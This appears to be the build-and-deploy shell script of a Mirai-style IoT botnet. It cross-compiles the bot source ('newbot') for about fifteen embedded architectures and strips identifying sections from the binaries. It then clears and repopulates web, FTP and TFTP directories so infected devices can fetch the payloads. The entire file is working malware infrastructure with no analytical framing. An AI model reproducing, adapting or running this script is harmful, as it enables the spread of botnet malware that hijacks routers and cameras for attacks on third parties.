function compile_bot {
    "/etc/xcompile/$1/bin/$1-gcc" -std=c99 $3 newbot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DARCH=\""$1"\"
    "/etc/xcompile/$1/bin/$1-gcc" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
                                                                                                                                                                                                               
function arc_compile {
    "/etc/xcompile/$1/bin/$1-gcc" -DARCH="$3" -std=c99 newbot/*.c -s -o release/"$2"
}

function compile_armv7 {
    "/etc/xcompile/$1/bin/$1-gcc" -std=c99 $3 newbot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DARCH=\""$1"\"
}
                                                                                                                                                                                      
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins

echo "Compiling - i486"
compile_bot i486 i486 "-static "

echo "Compiling - x86"
compile_bot i586 x86 "-static"

echo "Compiling - i686"
compile_bot i686 i686 "-static "

echo "Compiling - X86_64"
compile_bot x86_64 x86_64 "-static"

echo "Compiling - MIPS"
compile_bot mips mips "-static "

echo "Compiling - MIPSEL"
compile_bot mipsel mpsl "-static "

echo "Compiling - ARM/ARMv4"
compile_bot armv4l arm4 "-static "

echo "Compiling - ARMv5"
compile_bot armv5l arm5 "-static "

echo "Compiling - ARMv6"
compile_bot armv6l arm6 "-static"

echo "Compiling - ARMv7"
compile_armv7 armv7l arm7 "-static"

echo "Compiling - POWERPC"
compile_bot powerpc ppc "-static"

echo "Compiling - SPARC"
compile_bot sparc spc "-static"

echo "Compiling - M68K"
compile_bot m68k m68k "-static"

echo "Compiling - SH4"
compile_bot sh4 sh4 "-static"

echo "Compiling - ARC"
arc_compile arc arc "-static"

rm -rf /var/www/html/bins/*

cp release/* /var/www/html/bins
cp release/* /var/ftp
cp release/* /var/lib/tftpboot
rm -rf release

touch /var/www/html/index.html
#touch /var/www/html/bins/index.html